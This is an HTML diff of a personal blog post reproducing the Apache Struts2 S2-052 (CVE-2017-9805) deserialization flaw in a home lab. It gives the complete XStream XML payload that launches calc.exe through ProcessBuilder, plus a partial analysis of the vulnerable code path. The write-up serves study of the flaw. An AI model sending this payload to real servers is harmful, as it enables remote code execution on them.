@@ -19,7 +19,7 @@
 
   <!-- 页面元数据 -->
   
-  <title>macOS软件安全与逆向分析阅读笔记 - 虽然没什么用但还是想记下来</title>
+  <title>struts2[s2-052]远程命令执行漏洞复现 - 虽然没什么用但还是想记下来</title>
   
 
   
@@ -384,7 +384,7 @@
     
     
       <h1 class="title">
-        macOS软件安全与逆向分析阅读笔记
+        struts2[s2-052]远程命令执行漏洞复现
       </h1>
       <div class='new-meta-box'>
         
@@ -408,7 +408,7 @@
             <div class="new-meta-item date">
   <a class='notlink'>
     <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：Mar 27, 2021</p>
+    <p>发布于：Mar 29, 2021</p>
   </a>
 </div>
 
@@ -419,7 +419,7 @@
   <div class="new-meta-item browse leancloud">
     <a class='notlink'>
       
-      <div id="lc-pv" data-title="macOS软件安全与逆向分析阅读笔记" data-path="/2021/03/27/macOS%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/">
+      <div id="lc-pv" data-title="struts2[s2-052]远程命令执行漏洞复现" data-path="/2021/03/29/struts2%5Bs2-052%5D%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
         <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
         <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
         次浏览
@@ -436,10 +436,53 @@
 
 
   
-  <p>本文记录阅读书籍时的总结。</p>
-<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p><a target="_blank" rel="noopener" href="https://github.com/feicong/macbook">源码地址</a></p>
-<h2 id="chapter1-如何分析macOS软件"><a href="#chapter1-如何分析macOS软件" class="headerlink" title="chapter1 如何分析macOS软件"></a>chapter1 如何分析macOS软件</h2><p>1、HT Editor下载</p>
-<p>​        版本2.1.0</p>
+  <h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>编号：CVE-2017-9805</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>1、Windows 10(64位)</p>
+<p>2、tomcat9.0</p>
+<p>参考</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44092289/article/details/88374898">安装配置 by荆棘云海</a></p>
+<p> <a target="_blank" rel="noopener" href="https://blog.csdn.net/wxb141001yxx/article/details/96976380">startup错误解决 by Jessica-小波</a></p>
+<p>/bin目录下，开启：startup，关闭：shutdown</p>
+<p>3、struts-2.5.12</p>
+<p><a target="_blank" rel="noopener" href="http://archive.apache.org/dist/struts/2.5.12/struts-2.5.12-apps.zip">下载地址</a></p>
+<p><a target="_blank" rel="noopener" href="https://archive.apache.org/dist/struts/2.5.12/">2.5.12源码下载地址</a></p>
+<p>4、bp</p>
+<p>在C盘目录下，直接<code>运行.bat</code>，使用Chrome浏览器，端口8088</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qiushisoftware/article/details/107784751">配置教程</a></p>
+<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>1、bp抓包</p>
+<p>访问<code>ip:8080/struts2-rest-showcase/</code></p>
+<p>![23780B29-373A-4DD1-A64F-BF7054D15196](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/23780B29-373A-4DD1-A64F-BF7054D15196.png)</p>
+<p>2、改包</p>
+<p>Content-Type: application/x-www-form-urlencoded 表示使用URL编码的方式来编码表单，是浏览器默认的编码格式。当action为get时候，浏览器用x-www-form-urlencoded的编码方式把form数据转换成一个字串（name1=value1&amp;name2=value2…），然后把这个字串append到url后面，用?分割，加载这个新的url。</p>
+<p>post改为如下内容</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line"></span><br><span class="line">&lt;entry&gt;</span><br><span class="line"></span><br><span class="line">&lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt; &lt;dataHandler&gt; &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt; &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt; &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt; &lt;initialized&gt;false&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt; &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;command&gt; &lt;string&gt;calc.exe&lt;/string&gt; &lt;/command&gt; &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; &lt;/next&gt; &lt;/iter&gt; &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;foo&lt;/name&gt; &lt;/filter&gt; &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt; &lt;/serviceIterator&gt; &lt;lock/&gt; &lt;/cipher&gt; &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt; &lt;ibuffer&gt;&lt;/ibuffer&gt; &lt;done&gt;false&lt;/done&gt; &lt;ostart&gt;0&lt;/ostart&gt; &lt;ofinish&gt;0&lt;/ofinish&gt; &lt;closed&gt;false&lt;/closed&gt; &lt;/is&gt; &lt;consumed&gt;false&lt;/consumed&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;/entry&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;/entry&gt;</span><br><span class="line"></span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>发送，弹出计算器～</p>
+<p>![633599BB-D9D3-4EB1-A49C-5E45F9B44FA1](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/633599BB-D9D3-4EB1-A49C-5E45F9B44FA1.png)</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>参考现有文章，请求会被传给下面的函数👇</p>
+<p>![截屏2021-03-29 下午10.57.54](/Users/my/Library/Application Support/typora-user-images/截屏2021-03-29 下午10.57.54.png)</p>
+<p>其中含有语句</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HttpServletRequest request = ServletActionContext.getRequest();</span><br><span class="line">ContentTypeHandler handler = selector.getHandlerForRequest(request);</span><br></pre></td></tr></table></figure>
+
+<p>getHandlerForRequest在此处是XStreamHandler，随后调用如下函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">toObject</span><span class="params">(Reader in, Object target)</span> </span>&#123;</span><br><span class="line">    XStream xstream = createXStream();</span><br><span class="line">    xstream.fromXML(in, target);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>from XML 调用unmarshal，创建hashMap并且调用PopulateMap</p>
+<p>PopulateMap调用PutCurrentEntryIntoMap，其再调用readItem，此时变量值如下</p>
+<p>![AB081109-12BC-43E4-8A51-F763A90FA838](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/AB081109-12BC-43E4-8A51-F763A90FA838.png)</p>
+<p>接着调用doUnmarshal，得到node name，搜索class name。</p>
+<p>…</p>
+<p>下面还有很复杂的过程，但是自己既不会java，也没弄好调试…所以看不懂</p>
+<p>大致的过程就是REST插件在解析请求中的xml文件时，调用了XStreamHandler，传入的数据会被默认进行反序列化，如果当传入的xml是个经过XStream序列化的恶意对象时，便造成反序列化漏洞。</p>
+<p>收获：</p>
+<p>1、如果想自己分析的话，需要远程调试。但是还没配置好</p>
+<p>2、三五太难了😭</p>
+<p>参考</p>
+<p><a target="_blank" rel="noopener" href="https://www.mcafee.com/blogs/other-blogs/mcafee-labs/apache-struts-at-rest-analyzing-remote-code-execution-vulnerability-cve-2017-9805/">Apache Struts at REST: Analyzing Remote Code Execution Vulnerability CVE-2017-9805 by McAfee</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/7490260.html">struts2(s2-052)远程命令执行漏洞复现 by 渗透测试中心</a></p>
+<p><a target="_blank" rel="noopener" href="https://manning23.github.io/2017/09/10/Struts2-S2-052%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-9805/">STRUTS2 S2-052远程代码执行漏洞分析 CVE-2017-9805 by MANNING23</a></p>
 
   
   
@@ -457,7 +500,7 @@
               
             
               
-                <p>本文永久链接是：<a href=http://example.com/2021/03/27/macOS%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/>http://example.com/2021/03/27/macOS%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/</a></p>
+                <p>本文永久链接是：<a href=http://example.com/2021/03/29/struts2[s2-052]%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/>http://example.com/2021/03/29/struts2[s2-052]%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></p>
               
             
           </blockquote>
@@ -474,10 +517,10 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-03-27T18:54:04+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-03-31T12:36:15+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Mar 27, 2021</p>
+    <p>更新于：Mar 31, 2021</p>
   </a>
 </div>
 
@@ -496,7 +539,7 @@
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2021/03/27/macOS%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/&title=macOS软件安全与逆向分析阅读笔记 - 虽然没什么用但还是想记下来&summary="
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2021/03/29/struts2[s2-052]%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=struts2[s2-052]远程命令执行漏洞复现 - 虽然没什么用但还是想记下来&summary="
           
           >
           
@@ -508,7 +551,7 @@
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2021/03/27/macOS%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/&title=macOS软件安全与逆向分析阅读笔记 - 虽然没什么用但还是想记下来&summary="
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2021/03/29/struts2[s2-052]%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=struts2[s2-052]远程命令执行漏洞复现 - 虽然没什么用但还是想记下来&summary="
           
           >
           
@@ -520,7 +563,7 @@
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2021/03/27/macOS%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/&title=macOS软件安全与逆向分析阅读笔记 - 虽然没什么用但还是想记下来&summary="
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2021/03/29/struts2[s2-052]%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/&title=struts2[s2-052]远程命令执行漏洞复现 - 虽然没什么用但还是想记下来&summary="
           
           >
           
@@ -550,21 +593,29 @@
   
     <div class="prev-next">
       
-        <a class='prev' href='/2021/03/29/struts2%5Bs2-052%5D%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/'>
-          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>struts2[s2-052]远程命令执行漏洞复现</p>
-          <p class='content'>漏洞信息编号：CVE-2017-9805
-环境搭建1、Windows 10(64位)
-2、tomcat9.0
-参考
-安装配置 by荆棘云海
- startup错误解决 by Jessica-小波
-...</p>
+        <a class='prev' href='/2021/03/30/leetCode01/'>
+          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>leetCode01</p>
+          <p class='content'>3.301、193. 有效电话号码
+
+考点
+
+1、grep的用法
+-P 表示Perl语言的正则表达式
+
+思路
+
+正则匹配，注意格式以及能否优化代码
+参考https://leetcode-cn.c...</p>
         </a>
       
       
-        <a class='next' href='/2021/03/27/easyconnect%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/'>
-          <p class='title'>connect命令执行漏洞<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>mac版下载地址 http://download.sangfor.com.cn/download/product/sslvpn/pkg/mac_ec_sp/EasyConnect.dmg 版本：...</p>
+        <a class='next' href='/2021/03/27/macOS%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/'>
+          <p class='title'>macOS软件安全与逆向分析阅读笔记<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>本文记录阅读书籍时的总结。
+资源源码地址
+chapter1 如何分析macOS软件1、HT Editor下载
+​        版本2.1.0
+</p>
         </a>
       
     </div>
@@ -607,7 +658,7 @@
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B5%84%E6%BA%90"><span class="toc-text">资源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#chapter1-%E5%A6%82%E4%BD%95%E5%88%86%E6%9E%90macOS%E8%BD%AF%E4%BB%B6"><span class="toc-text">chapter1 如何分析macOS软件</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF"><span class="toc-text">漏洞信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B"><span class="toc-text">复现过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a></li></ol>
     </div>
   </section>
 
@@ -627,7 +678,7 @@
 <script>
   window.pdata={}
   pdata.ispage=true;
-  pdata.postTitle="macOS软件安全与逆向分析阅读笔记";
+  pdata.postTitle="struts2[s2-052]远程命令执行漏洞复现";
   pdata.commentPath="";
   pdata.commentPlaceholder="";
 
